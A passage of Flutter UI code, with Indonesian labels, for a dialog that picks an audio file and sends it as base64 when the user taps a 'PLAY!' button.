                border: Border.all(color: _fileName != null ? _green.withOpacity(0.5) : _green.withOpacity(0.25), width: _fileName != null ? 1.5 : 1)),
              child: _picking
                ? Row(mainAxisAlignment: MainAxisAlignment.center, children: [SizedBox(width: 16, height: 16, child: CircularProgressIndicator(color: _green, strokeWidth: 2)), const SizedBox(width: 10), const Text('Membuka file manager...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white))])
                : _fileName != null
                  ? Row(children: [const Icon(Icons.audio_file_rounded, color: _green, size: 20), const SizedBox(width: 10), Expanded(child: Text(_fileName!, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white), overflow: TextOverflow.ellipsis)), const Icon(Icons.check_circle_rounded, color: _green, size: 18)])
                  : Row(mainAxisAlignment: MainAxisAlignment.center, children: [Icon(Icons.folder_open_rounded, color: _green.withOpacity(0.7), size: 22), const SizedBox(width: 10), Text('Pilih File Audio (mp3/wav/ogg)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white.withOpacity(0.5)))]),
            ),
          ),
          const SizedBox(height: 20),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(context),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: (_base64Audio == null || _sending) ? null : _send,
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: _base64Audio != null ? [_green, const Color(0xFF059669)] : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                  borderRadius: BorderRadius.circular(12)),
                child: Center(child: _sending
                  ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Text('PLAY!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }
}
